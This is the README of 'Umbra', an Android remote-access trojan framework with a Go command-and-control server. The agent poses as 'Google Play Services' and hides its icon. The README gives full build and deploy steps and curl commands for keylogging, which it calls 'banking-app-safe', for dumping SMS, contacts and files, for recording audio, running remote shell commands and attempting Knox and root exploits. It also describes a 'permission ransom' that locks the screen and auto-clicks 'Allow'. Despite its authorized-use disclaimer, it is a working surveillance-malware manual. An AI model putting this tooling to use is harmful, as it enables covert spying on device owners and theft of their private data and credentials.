# Umbra — Android Security Research Framework

[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
[![Platform: Android](https://img.shields.io/badge/Platform-Android-green.svg)](#)
[![Server: Go](https://img.shields.io/badge/Server-Go%20%2F%20GoFrame-00ADD8.svg)](#)
[![Agent: Kotlin](https://img.shields.io/badge/Agent-Kotlin-7F52FF.svg)](#)
[![Transport: WSS + AES-256-GCM](https://img.shields.io/badge/Transport-WSS%20%2B%20AES--256--GCM-red.svg)](#)

> **Umbra** is a self-hosted Android research framework for **authorized security assessment and device-analysis**. It pairs a stealthy Kotlin agent with a GoFrame v2 C2 server and a zero-dependency web dashboard. All traffic is WebSocket-over-TLS (`wss://`) with per-message AES-256-GCM encryption.

> ⚠️ **Authorized use only.** Umbra ships with privilege-escalation, permission-bypass, keylogging, and device-analysis capabilities that are illegal to use against devices you do not own or lack explicit written permission to test. See the [Legal & Ethical Disclaimer](#legal--ethical-disclaimer) before using this code.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Repository Layout](#repository-layout)
- [Modules](#modules)
- [Quick Start — Build & Deploy](#quick-start--build--deploy)
- [Find Your Server IP](#find-your-server-ip)
- [Permission Strategy](#permission-strategy)
- [Permission Ransom Mode](#permission-ransom-mode)
- [Keylogger Activation (Accessibility + IME)](#keylogger-activation-accessibility--ime)
- [Manual Testing (curl)](#manual-testing-curl)
- [API Reference](#api-reference)
- [Dashboard](#dashboard)
- [Troubleshooting](#troubleshooting)
- [Known Limitations](#known-limitations)
- [Environment](#environment)
- [Legal & Ethical Disclaimer](#legal--ethical-disclaimer)

---

## Features

- **Stealth agent** — installs as `org.umbra.core` with the display label *"Google Play Services"*. No launcher icon ever appears.
- **18+ modules** — SMS, calls, contacts, files, shell, GPS, microphone (M4A), camera, silent-grant, Knox exploitation, device admin, permission ransom, live monitoring, root, keylogger, and more.
- **Two keylogger modes** — an accessibility-service keylogger *and* a banking-app-safe IME (custom keyboard) keylogger.
- **Permission ransom** — full-screen lock that blocks device usage until the user grants all 14 dangerous permissions. Uses `startLockTask()` to pin the screen, a 1-second watchdog, an accessibility-service auto-click that taps "Allow" on every dialog, and a 2-second re-request loop. Survives reboots. Zero user interaction required once the accessibility service is enabled.
- **Device admin** — registered as an active device admin via `dpm set-active-admin`, enabling background activity starts and DPM policy control.
- **Encrypted transport** — `wss://` with AES-256-GCM per-message encryption.
- **Self-signed TLS** — the server auto-generates a P-256 certificate on first run.
- **Live push monitoring** — SMS interception, call-state changes, clipboard, and keystroke streaming pushed to the dashboard in real time.
- **Persistence chain** — ContentProvider auto-start, boot receiver, watchdog alarm, JobScheduler, install receiver, network-change reconnection, FCM wake, and battery-optimization prompts.
- **Dashboard with export** — single vanilla-JS `index.html` with SSE result streaming, JSON export on every result type, bulk image download, audio player, and file download links.

---

## Architecture

```
                          wss://YOUR_SERVER_IP:8443/c2
┌─────────────────────────────┐      AES-256-GCM      ┌──────────────────────────────┐
│   Android Agent (Kotlin)    │ ◄───────────────────► │    GoFrame C2 Server (Go)    │
│   package: org.umbra.core   │    encrypted frames   │    listens on :8443 (TLS)    │
│                             │                       │                              │
│   • 18+ modules             │                       │    • REST API  (/api/*)      │
│   • Knox binder exploits    │                       │    • WebSocket  (/c2)        │
│   • Keylogger (a11y + IME)  │                       │    • SSE events (/api/events)│
│   • Permission ransom       │                       │    • Device registry         │
│   • Device admin            │                       │    • Command queue           │
│   • Persistence chain       │                       │                              │
│   • FCM wake               │                       │                              │
└─────────────────────────────┘                       └───────────────┬──────────────┘
                                                                       │  SSE push
                                                                       ▼
                                                       ┌──────────────────────────────┐
                                                       │   Dashboard (vanilla JS)     │
                                                       │   resource/public/index.html │
                                                       │   device list + live results │
                                                       │   export JSON + bulk download│
                                                       └──────────────────────────────┘
```

| Component | Language / Stack | Role |
|-----------|------------------|------|
| **Agent** | Kotlin (Android) | Runs on the target device, executes commands, streams results |
| **Server** | Go + GoFrame v2 | Terminates TLS, authenticates agents, queues commands, broadcasts results |
| **Dashboard** | Vanilla JS / HTML | Operator console: device list, one-click actions, live keystroke/results feed, export, bulk download |
| **Transport** | WebSocket over TLS + AES-256-GCM | Bi-directional encrypted channel on port `8443` |

**Flow:** the dashboard (or `curl`) POSTs a command to `POST /api/command` → the server pushes it to the device over the `wss://` channel → the agent executes the module/action and returns an encrypted result → the server decrypts and broadcasts it to the dashboard via SSE (`GET /api/events`).

---

## Repository Layout

```
UMBRA/
├── Umbra-Client/                    # Kotlin Android agent
│   └── app/src/main/java/org/umbra/core/
│       ├── MainActivity.kt          # Launcher + engine bootstrap
│       ├── core/                    # Engine, crypto, info, sandbox detector
│       ├── c2/                      # WebSocket transport, coordinator, dispatcher
│       ├── modules/                 # 18+ capability modules
│       └── persistence/             # Boot/watchdog/network/FCM/ransom persistence
└── Umbra-Server/                    # GoFrame v2 C2 server
    └── umbra-c2/app/umbra-c2/
        ├── main.go                  # Entry point
        ├── internal/
        │   ├── cmd/                 # Routing, TLS, banner
        │   ├── controller/c2/       # HTTP + WebSocket handlers
        │   ├── service/             # WS, crypto, registry, broadcast
        │   └── model/               # Data structures
        └── resource/
            ├── public/index.html    # Dashboard
            └── server.crt/server.key# Auto-generated TLS cert
```

---

## Modules

### Core Modules (18)

| # | Module | Actions | Description | Status |
|---|--------|---------|-------------|--------|
| 1 | `ping` | `ping` | Round-trip latency check | ✅ |
| 2 | `info` | `gather` | Device info (model, SDK, fingerprint, hardware, arch) | ✅ |
| 3 | `sms` | `list` `read` `dump` `send` `capture` | SMS via `ContentResolver` + binder bypass fallback | ✅ (needs `pm grant`) |
| 4 | `calls` | `list` | Call log | ✅ |
| 5 | `contacts` | `list` | Contacts | ✅ |
| 6 | `files` | `list` `read` `download` | MediaStore enumeration + base64 file content | ✅ |
| 7 | `shell` | `exec` | Remote command execution | ✅ |
| 8 | `location` | `get` | GPS + network location | ⚠️ GPS off → timeout |
| 9 | `mic` | `record` `stop` | M4A (MPEG-4) audio capture with correct duration tracking | ✅ |
| 10 | `camera` / `screenshot` | `capture` / `screenshot` | Camera capture + screen capture | ❌ Knox HAL blocks camera |
| 11 | `silent_grant` | `grant` | 14 permission-bypass techniques | ❌ Android 16 blocks all 14 |
| 12 | `knox` | `grant` `enumerate` `shell_exploit` | Samsung Knox binder exploitation (206 IApplicationPolicy methods mapped) | ✅ binder accessible |
| 13 | `dpm_grant` | `grant` | DevicePolicyManager permission grant (requires device owner) | ⚠️ needs device owner |
| 13b | `dpm_remove` | `remove` | Deactivate own device admin via `removeActiveAdmin()` (enables uninstall) | ⚠️ only works for test-only admin |
| 14 | `live` | `start` `stop` `status` | Real-time push monitoring (SMS, call state, clipboard) | ✅ |
| 15 | `root` | `check` `exploit` `daemonize` `exploit_download` | 8-vector privilege-escalation chain | ⚠️ checks only, no root yet |
| 16 | `keylog` | `start` `stop` `dump` `status` `start_keyboard` `enable_keyboard` | Keystroke capture (accessibility + IME) | ✅ both modes |
| 17 | `clipboard` | `scrape` `readImage` | Read clipboard text and images | ✅ |
| 18 | `notifications` | `list` | Capture all notifications (NotificationListenerService) | ✅ |

### Additional Modules

| Module | Actions | Description |
|--------|---------|-------------|
| `knox_hide` / `knox_unhide` / `knox_check` | — | KnoxGuard hide/unhide/check |
| `knox_hide_v2` / `knox_unhide_v2` | — | KnoxHideExploit (advanced hide) |
| `semclipboard` | `scrape` | Samsung Semantic-clipboard exploit |
| `pat` | `exploit` | PatToken exploit |
| `authfw` | `exploit` | AuthFw exploit |

### Knox Transaction Code Map (decompiled from knoxsdk.jar)

| Service | TX | Method | Requires |
|---------|-----|--------|----------|
| `application_policy` | 154 | `applyRuntimePermissions(AppIdentity, List<String>, int)` | Active Knox admin |
| `application_policy` | 183 | `addApplicationToCameraAllowList` | Active Knox admin |
| `enterprise_policy` | 1 | `isAdminActive(ComponentName)` | — |
| `enterprise_policy` | 4 | `setActiveAdmin` | `KNOX_APP_MGMT` (signature) |
| `enterprise_policy` | 22 | `setActiveAdminSilent` | `KNOX_APP_MGMT` (signature) |
| `enterprise_policy` | 12 | `hasAnyActiveAdmin` | — |
| `device_policy` | 252 | `setPermissionGrantState` | Device owner |
| `device_policy` | 250 | `setPermissionPolicy` | Device owner |
| `permissionmgr` | 15 | `grantRuntimePermission(pkg, perm, deviceId, userId)` | `GRANT_RUNTIME_PERMISSIONS` (shell only) |

---

## Quick Start — Build & Deploy

### 0. Prerequisites

- **Server host:** Linux with Go ≥ 1.21 and GoFrame v2 dependencies.
- **Android device:** a test device with `adb` (USB debugging enabled), Android 11+.
- **Android SDK / JDK:** Android Studio (or a JDK 17+) to build the APK.

### 1. Build the C2 server

```bash
cd ~/UMBRA/Umbra-Server/umbra-c2/app/umbra-c2
export PATH="$HOME/go/bin:$HOME/go-projects/bin:$PATH"
go build -o /tmp/umbra-server .
```

### 2. Build the Android agent APK

```bash
cd ~/UMBRA/Umbra-Client
export JAVA_HOME="$HOME/.local/share/JetBrains/Toolbox/apps/android-studio/jbr"
./gradlew clean assembleDebug
```

> Output APK: `app/build/outputs/apk/debug/app-debug.apk`

> Always use `clean assembleDebug` — Gradle incremental compilation misses some Kotlin file changes.

### 3. Run the server

```bash
fuser -k 8443/tcp 2>/dev/null
/tmp/umbra-server
```

The server auto-generates a self-signed TLS certificate on first run and listens on `:8443`.

### 4. Install the agent

```bash
adb install app/build/outputs/apk/debug/app-debug.apk
```

> No `-t` flag — the APK is a normal (non-testOnly) install. This keeps the trojan concept intact (installs like any sideloaded app).

### 5. Register as device admin (enables permission ransom + background activity start)

```bash
adb shell dpm set-active-admin org.umbra.core/.persistence.UmbraAdminReceiver
```

### 6. Enable the accessibility service (enables auto-click on permission dialogs + keylogger)

```bash
adb shell settings put secure enabled_accessibility_services org.umbra.core/org.umbra.core.modules.UmbraAccessibilityService
adb shell settings put secure accessibility_enabled 1
```

### 7. Grant runtime permissions

```bash
for p in CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO \
         READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_MEDIA_AUDIO READ_MEDIA_VISUAL_USER_SELECTED \
         READ_SMS RECEIVE_SMS READ_CONTACTS READ_CALL_LOG READ_PHONE_STATE \
         POST_NOTIFICATIONS; do
    adb shell pm grant org.umbra.core android.permission.$p
done
```

> Alternatively, skip this step and let the **Permission Ransom** auto-grant everything via the accessibility-service auto-click — see below.

### 8. Launch the agent

```bash
adb shell am start -n org.umbra.core/.MainActivity
```

### 9. Open the dashboard

```text
https://YOUR_SERVER_IP:8443
```

(Open in an incognito/private window and hard-refresh with `Ctrl+Shift+R` on first load.)

### Uninstall

The APK is not `testOnly`, so `dpm remove-active-admin` will refuse to remove the admin. Use this sequence:

```bash
# 1. Disable the package (clears enough DPM state for uninstall)
adb shell pm disable-user org.umbra.core

# 2. Re-enable it
adb shell pm enable org.umbra.core

# 3. Uninstall
adb uninstall org.umbra.core
```

> Alternative: trigger the `dpm_remove` module via C2 (calls `removeActiveAdmin()` from the app's own context — works only if the admin was registered as test-only), then uninstall. Or deactivate manually: **Settings → Security and privacy → Other security settings → Device admin apps** → find *"Google Play Services"* → deactivate → uninstall.

---

## Find Your Server IP

The dashboard URL uses **your machine's LAN IP**, not a fixed address — it changes per network. Find it with:

```bash
hostname -I
# Example output: 192.168.1.50 172.17.0.1
# Use the FIRST address (192.168.1.50 in this example)
```

Then open:

```text
https://192.168.1.50:8443
```

The agent connects to the **same IP** as the server. It reads the C2 endpoint from the `DEFAULT_C2` constant in `UmbraEngine.kt`, but you can override it at runtime via ADB without rebuilding:

```bash
adb shell "echo 'wss://YOUR_SERVER_IP:8443/c2' > /data/data/org.umbra.core/shared_prefs/umbra_c2_url"
adb shell am force-stop org.umbra.core
adb shell am start -n org.umbra.core/.MainActivity
```

> **Rebuild note:** the compiled APK hardcodes `DEFAULT_C2` in `Umbra-Client/app/src/main/java/org/umbra/core/core/UmbraEngine.kt`. If you need a fixed endpoint, change `DEFAULT_C2` there *before* building. The ADB override above is the fastest way to retarget an already-built APK.

---

## Permission Strategy

Android 16 (Samsung One UI 8.5) enforces the permission model at multiple layers — PackageManager, AppOpsManager, SELinux, and Knox HAL. Silent (zero-touch) permission grants are **impossible** from an untrusted app on this platform. The following paths were all tested and blocked:

| Technique | Result |
|-----------|--------|
| `adb shell pm grant` | ✅ Works — but requires ADB (shell UID 2000) |
| `permissionmgr` tx=15 (`grantRuntimePermission`) | ✅ From shell / ❌ from app — `GRANT_RUNTIME_PERMISSIONS` not grantable to apps |
| `application_policy` tx=154 (`applyRuntimePermissions`) | ❌ Requires active Knox admin |
| `enterprise_policy` tx=4/22 (`setActiveAdmin`) | ❌ Requires `KNOX_APP_MGMT` (signature\|privileged) |
| `device_policy` tx=252 (`setPermissionGrantState`) | ❌ Requires device owner |
| `appops set ALLOW` | ❌ ContentProvider checks `checkSelfPermission()` before appops |
| Device owner via `dpm set-device-owner` | ❌ Blocked when accounts exist on device |

### Three options for granting permissions:

1. **ADB `pm grant`** (manual, reliable) — run the grant loop in step 6 above.
2. **Permission Ransom** (fully automated) — see below.
3. **Root exploit** — once root is achieved, copy APK to `/system/priv-app/` and grant all permissions programmatically.

---

## Permission Ransom Mode

When you cannot use ADB `pm grant` (e.g., the device is remote), the **Permission Ransom** locks the device and auto-grants all 14 dangerous permissions with **zero user interaction** — the accessibility service taps "Allow" on every dialog automatically.

### How it works

1. `UmbraService` (foreground service) runs a watchdog every **1 second** checking `checkSelfPermission()` for all 14 dangerous permissions.
2. If any are missing, it launches `PermissionRansomActivity` — a **full-screen opaque** activity (`Theme.Material.NoActionBar`) that calls `startLockTask()` to **pin the screen** (home/recents/back are blocked).
3. The activity auto-calls `requestPermissions()` for all missing permissions after 1 second.
4. The system permission dialog (`GrantPermissionsActivity`) appears over the locked screen.
5. The `UmbraAccessibilityService` detects the dialog (via `TYPE_WINDOW_STATE_CHANGED`) and **auto-clicks "Allow"** on every dialog, granting permissions one by one without any user taps.
6. If a permission is denied, `onRequestPermissionsResult` re-requests it after **2 seconds** — the dialog keeps coming back until everything is granted.
7. If the user escapes the lock task (long-press Back+Recents), the 1-second watchdog + `AlarmManager` re-launch the activity immediately.
8. If the phone is rebooted, `BootReceiver` + `KeepAliveWorker` + `WatchdogAlarm` + `WatchdogJob` (all persisted) re-launch the ransom after boot.
9. When all 14 permissions are granted, everything stops — the lock task releases, the watchdog idles, and the app goes completely stealth.

### Defense layers (5)

| Layer | Mechanism | What it blocks |
|-------|-----------|----------------|
| 1 | `startLockTask()` | Home, Recents, Back buttons — screen is pinned |
| 2 | FGS watchdog (1s) | Activity dismissed — re-launches instantly |
| 3 | `AlarmManager` (1s) | FGS killed — re-launches via PendingIntent |
| 4 | Accessibility auto-click | User tapping "Don't allow" — the "Allow" button is clicked automatically |
| 5 | Boot persistence | Phone reboot — BootReceiver + KeepAliveWorker + WatchdogJob re-launch |

### Why it works

- The app is registered as a **device admin** (`dpm set-active-admin`), which exempts it from background activity start restrictions.
- `startLockTask()` pins the screen — the user physically cannot leave the ransom until permissions are granted.
- The foreground service (`UmbraService`) keeps the watchdog alive through Doze.
- The accessibility service runs the auto-click in a separate system-managed process, so it survives even if the main app process is killed.
- Only the system permission dialog is visible — the app itself is invisible (no launcher icon).

### Test result (SM-A356B, Android 16)

- Fresh install → ransom shows with 14/14 permissions missing, screen pinned (`mLockTaskModeState=PINNED`).
- Accessibility auto-click grants all permissions automatically: 14 → 7 → 6 → 5 → 2 → **all granted**.
- Launcher blocked with `Attempted Lock Task Mode violation` when user presses Home.
- Full reboot test passed: app auto-started after boot, ransom re-appeared, auto-granted everything, then went stealth.
- Final state: `granted=false` count = 0, ransom stopped, agent connected to C2 (`online_count=1`), lock task released, app icon hidden.

### Files

- `PermissionRansomActivity.kt` — full-screen lock activity, `startLockTask()`, `requestInFlight` guard, `isShowing` flag, re-request loop
- `PermissionOverlayService.kt` — `SYSTEM_ALERT_WINDOW` overlay (second layer, draws over everything)
- `UmbraAccessibilityService.kt` — auto-clicks "Allow" on dialogs, auto-toggles overlay, re-launches on app switch
- `UmbraService.kt` — 1s watchdog, `killBackgroundProcesses`, starts overlay
- `UmbraAdminReceiver.kt` + `res/xml/device_admin.xml` — device admin registration
- `DpmPermissionGrant.kt` — DPM-based grant + `dpm_remove` action (removes own admin)
- `BootReceiver.kt` — launches ransom 5s after boot
- `KeepAliveWorker.kt` / `WatchdogAlarm.kt` / `WatchdogJob.kt` — all check permissions and re-launch ransom

---

## Keylogger Activation (Accessibility + IME)

Umbra ships **two independent keyloggers**. Choose based on your target and OPSEC requirements.

| | Accessibility keylogger | IME (keyboard) keylogger |
|---|---|---|
| Module action | `keylog/start` | `keylog/start_keyboard` |
| Mechanism | `UmbraAccessibilityService` (`TYPE_VIEW_TEXT_CHANGED`) | `UmbraKeyboardService` (custom input method) |
| Detection | **Detected by banking apps** (they enumerate enabled accessibility services) | **Banking-app-safe** — input methods are not flagged the way accessibility services are |
| Enable once via ADB | Yes | Yes (victim must select it once) |

### Method A — Accessibility service (simpler, more detectable)

Enable the accessibility service via ADB:

```bash
adb shell settings put secure enabled_accessibility_services org.umbra.core/org.umbra.core.modules.UmbraAccessibilityService
adb shell settings put secure accessibility_enabled 1
```

Then start the keylogger (dashboard **Keylog Start** button, or curl):

```bash
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"start"}'
```

### Method B — IME custom keyboard (banking-app-safe)

Enable and select the Umbra keyboard as the active input method:

```bash
adb shell ime enable org.umbra.core/.modules.UmbraKeyboardService
adb shell ime set    org.umbra.core/.modules.UmbraKeyboardService
```

Then start the IME keylogger:

```bash
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"start_keyboard"}'
```

> On a device without `WRITE_SECURE_SETTINGS`, the agent falls back to opening the Accessibility / input-method settings screen so the user can enable it manually.

### Retrieve, stop, and status

```bash
# Dump captured keystrokes (buffer + encrypted on-disk store)
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"dump"}'

# Stop capture (persists buffer to disk)
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"stop"}'

# Check capture state (accessibility_enabled / ime_enabled / ime_default / streaming)
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"status"}'
```

**How it works:** keystrokes are buffered in memory (max 1000 entries) and persisted to an XOR-encrypted on-disk file (`umbra_keylog.dat`). When streaming is enabled, each keystroke (with package name and timestamp) is pushed to the C2 server in real time and rendered in the dashboard's live *KEYSTROKES* panel.

---

## Manual Testing (curl)

Use `curl -k` to skip the self-signed certificate check. Replace `YOUR_SERVER_IP` and `<DEVICE_ID>` (find the device ID with `GET /api/devices`).

```bash
URL="https://YOUR_SERVER_IP:8443"
ID="<DEVICE_ID>"
```

### 1. ping

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"ping","action":"ping"}'
```

### 2. info / gather

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"info","action":"gather"}'
```

### 3. sms

```bash
# List recent SMS
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"sms","action":"list","params":{"count":"3"}}'

# Dump full SMS database
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"sms","action":"dump"}'

# Send an SMS (test device only)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"sms","action":"send","params":{"to":"+155****4567","body":"test"}}'
```

### 4. calls

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"calls","action":"list","params":{"count":"3"}}'
```

### 5. contacts

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"contacts","action":"list","params":{"count":"3"}}'
```

### 6. files

```bash
# List images
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"files","action":"list","params":{"type":"images","count":"5"}}'

# List documents
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"files","action":"list","params":{"type":"documents","count":"5"}}'

# Read a file by absolute path (returns base64 content)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"files","action":"read","params":{"path":"/sdcard/Download/example.txt"}}'
```

### 7. shell

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"shell","action":"exec","params":{"cmd":"id; uname -a"}}'
```

### 8. location

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"location","action":"get"}'
```

### 9. mic

```bash
# Record 5 seconds of M4A audio (base64, playable in browser)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"mic","action":"record","params":{"duration":"5"}}'

# Stop recording
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"mic","action":"stop"}'
```

> Audio is recorded as MPEG-4 (M4A) with AAC encoder at 44.1 kHz / 96 kbps. The base64 payload starts with a proper MPEG-4 `ftyp` box header and is directly playable in the dashboard's `<audio>` player or downloadable as an `.m4a` file.

### 10. camera / screenshot

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"camera","action":"capture"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"screenshot","action":"screenshot"}'
```

### 11. silent_grant

```bash
# Attempt all 14 permission-bypass techniques (comma-separated target list)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"silent_grant","action":"grant","params":{"permissions":"CAMERA,RECORD_AUDIO,ACCESS_FINE_LOCATION"}}'
```

### 12. knox

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"knox","action":"grant"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"knox","action":"enumerate"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"knox","action":"shell_exploit"}'
```

### 13. dpm_grant / dpm_remove

```bash
# Attempt DPM-based permission grant (requires device owner)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"dpm_grant","action":"grant"}'

# Deactivate own device admin (enables uninstall — only works for test-only admin)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"dpm_remove","action":"remove"}'
```

### 14. live

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"live","action":"start"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"live","action":"status"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"live","action":"stop"}'
```

### 15. root

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"root","action":"check"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"root","action":"exploit"}'
```

### 16. keylog (see [Keylogger Activation](#keylogger-activation-accessibility--ime))

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"keylog","action":"start"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"keylog","action":"start_keyboard"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"keylog","action":"dump"}'
```

---

## API Reference

Base URL: `https://YOUR_SERVER_IP:8443`

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/health` | Server health: status, device count, online count, uptime |
| `GET` | `/api/devices` | List registered devices (id, info, last_seen, online, has_fcm) |
| `POST` | `/api/command` | Queue a command for a device |
| `POST` | `/api/result` | HTTP fallback for agent result delivery (encrypted payload) |
| `POST` | `/api/register-fcm` | Register an FCM token for push wake |
| `GET` | `/api/stage2?file=stage2.dex` | Serve native exploit payloads (`stage2.dex`, `payload.sh`) |
| `GET` | `/api/events` | Server-Sent Events stream for dashboard results |
| `GET` | `/c2` | WebSocket upgrade endpoint for agent connections |
| `GET` | `/` | Dashboard (static files from `resource/public/`) |

### Command format (`POST /api/command`)

```json
{
  "device_id": "<DEVICE_ID>",
  "module": "sms",
  "action": "list",
  "params": { "count": "5" }
}
```

Response:

```json
{ "command_id": "<uuid>", "status": "queued" }
```

Results are delivered asynchronously — over the WebSocket to the agent, back encrypted, then broadcast to the dashboard via SSE. The agent also supports an HTTP fallback path via `POST /api/result`.

---

## Dashboard

Open `https://YOUR_SERVER_IP:8443` in a browser.

- **DEVICES panel (left):** auto-selects the first online device; shows per-device id, model, OS, and online dot (green/red).
- **Toolbar (top):** one-click actions — **Ping, Info, SMS, Calls, Contacts, Images, Docs, Shell, GPS, Mic, Screen, Grant**.
- **Keylogger toolbar:** **Keylog Start / Stop / Dump / Status**.
- **KEYSTROKES panel:** live keystroke feed (package + text + timestamp).
- **RESULT panel:** decoded command output with context-aware rendering:
  - **SMS / contacts / calls / shell / device info:** formatted JSON with Export JSON button.
  - **Images:** inline preview (`<img>`) + download link.
  - **Audio (mic):** `<audio controls>` player + download link (`.m4a`).
  - **Camera / screenshot:** inline image preview + download link.
  - **Location:** coordinates + Google Maps link.
  - **Keylog dump:** formatted list with Export JSON button.
  - **File list:** table with view button + **Download All** button (fetches each image one by one and triggers individual downloads).
  - **Export JSON button** on every result type — downloads the raw payload as a timestamped `.json` file.

> If the dashboard appears empty on first load, open it in an incognito window and hard-refresh (`Ctrl+Shift+R`).

---

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Agent offline / not listed | `adb shell am force-stop org.umbra.core && adb shell am start -n org.umbra.core/.MainActivity` |
| Dashboard empty / stale | Open in incognito, `Ctrl+Shift+R` hard-refresh |
| `permission_denied` on module output | Re-run the `pm grant` loop after install, or let the Permission Ransom handle it |
| Permission ransom not triggering | Ensure device admin is registered: `adb shell dpm set-active-admin org.umbra.core/.persistence.UmbraAdminReceiver` |
| Server crash / port in use | `fuser -k 8443/tcp 2>/dev/null; /tmp/umbra-server` |
| APK changes not taking effect | Always `./gradlew clean assembleDebug` (not `assembleDebug`) |
| TLS cert warning in browser | Expected — the server uses a self-signed cert; proceed / import it |
| Agent connects to wrong IP | Re-issue the ADB `umbra_c2_url` override, or set `DEFAULT_C2` and rebuild |
| Camera / screen capture fails | Knox HAL / SELinux block it from an untrusted app; see Known Limitations |
| Mic recording shows 0s duration | Fixed — now uses `SystemClock.elapsedRealtime()` for accurate duration |
| Mic audio is garbage / won't play | Fixed — switched from AAC_ADTS to MPEG-4 (M4A) container |
| Permission ransom doesn't auto-click | Accessibility service unbound after reinstall — re-run `settings put secure enabled_accessibility_services ...` + `accessibility_enabled 1` |
| Permissions stuck `USER_FIXED` (won't show dialog) | User tapped "Don't allow" twice — run `adb shell pm reset-permissions org.umbra.core` to clear, or `pm clear` |
| Can't uninstall (`DELETE_FAILED_DEVICE_POLICY_MANAGER`) | Run `pm disable-user org.umbra.core` → `pm enable org.umbra.core` → `adb uninstall org.umbra.core` |

---

## Known Limitations

- **Permissions** — Android 16 (Samsung) blocks all silent-grant techniques from an untrusted app. Three options: ADB `pm grant`, Permission Ransom, or root exploit. See [Permission Strategy](#permission-strategy).
- **Device owner** — `dpm set-device-owner` is blocked when Google accounts exist on the device. The DPM permission grant module (`dpm_grant`) requires device owner to work.
- **Camera** — Knox HAL blocks the Camera2 API (`CAMERA_DISABLED by policy`). The `misc_policy` binder or `addApplicationToCameraAllowList` (tx=183) may unlock it, but both require an active Knox admin.
- **Screenshot** — SELinux blocks `screencap` for untrusted apps. Requires shell UID or root.
- **Location** — GPS fix times out if the GPS radio is off; network-location fallback is partial.
- **Root** — the 8-vector chain currently *detects* privilege-escalation opportunities but has not achieved root on the tested device.
- **Self-signed TLS** — the generated certificate is untrusted by browsers; use `curl -k` or import it manually.
- **Accessibility re-enable** — the accessibility service unbinds after every `adb install -r` / `pm clear`; re-run the `settings put secure enabled_accessibility_services` command to rebind it (Samsung quirk).

---

## Environment

| Component | Value |
|-----------|-------|
| **Test device** | Samsung Galaxy A35 (SM-A356B) |
| **Android** | 16 (SDK 36), One UI 8.5 |
| **Kernel** | 5.15.189 (July 2026 patch) |
| **SoC** | Exynos 1380 (s5e8835) |
| **SELinux** | Enforcing |
| **Server** | Go 1.23+, GoFrame v2 |
| **Agent** | Kotlin, Gradle 9.4.1 (wrapper), Android SDK 37, targetSdk 34 |
| **Dashboard** | Vanilla JS / HTML + SSE |
| **Transport** | `wss://` + AES-256-GCM, port `8443` |
| **License** | AGPL-3.0 |

---

## Legal & Ethical Disclaimer

**Umbra is a security-research and device-analysis tool for use on systems you own or have explicit written authorization to test.**

